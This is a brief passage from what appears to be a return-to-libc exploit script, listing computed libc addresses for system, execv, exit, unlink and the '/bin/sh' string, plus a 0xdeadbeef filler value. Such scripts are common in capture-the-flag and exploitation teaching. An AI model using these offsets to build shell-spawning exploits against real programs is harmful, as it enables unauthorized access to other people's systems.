...
# system
sys_addr = base_addr + 0x00048170
# execv
exec_addr = base_addr + 0x000de8a0
# /bin/sh
sh_addr = base_addr + 0x1bd0d5
# exit
ex_addr = base_addr + 0x0003a460
# unlink
ul_addr = base_addr + 0x0010c260
# dead
d_addr = 0xdeadbeef
